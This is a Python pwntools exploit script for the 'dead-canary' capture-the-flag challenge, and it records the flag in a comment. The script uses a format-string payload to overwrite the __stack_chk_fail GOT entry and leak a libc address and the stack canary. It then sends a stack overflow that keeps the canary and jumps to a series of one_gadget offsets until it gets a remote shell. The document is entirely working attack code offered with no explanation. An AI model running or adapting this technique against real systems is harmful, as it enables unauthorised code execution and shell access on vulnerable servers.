#exploit for dead-canary
#flag=flag{t0_k1ll_a_canary_4e47da34}
from pwn import *
gadgets=[0x4f2c5,0x4f322,0xe569f,0xe5858,0xe585f,0xe5863,0x10a38c,0x10a398]
for gadget in gadgets:
	target=remote('2020.redpwnc.tf',31744)
	libc=ELF('/media/sf_kalishared/livectfs/dawgctf2020/tiktok/libc-2.27.so')
	print(target.recvuntil("name: "))
	main=0x400737
	stack_check_fail_got=0x601028

	payload="%41$p"+"%39$p"+"%"+str(main-32)+"x"+"%9$ln"+p64(stack_check_fail_got)
	payload=payload.ljust(265,"\x01")
	target.send(payload)
	print(target.recvuntil("Hello "))
	leak=target.recv()
	libc_leak=int(leak[2:14],16)
	libc_base=libc_leak-0x21b97
	libc_gadget=libc_base+gadget
	canary=int(leak[16:32],16)-1
	print(hex(libc_base))
	print(hex(canary))

	payload="A"*264+p64(canary)+"A"*8+p64(libc_gadget)
	target.send(payload)
	print(target.recv())
	target.sendline("ls")
	r=""
	try:
		r=target.recv()
		print("r="+r)
	except Exception:
		print("gadget fail")
		target.close()
	if(len(r)>0):
		target.interactive()
		
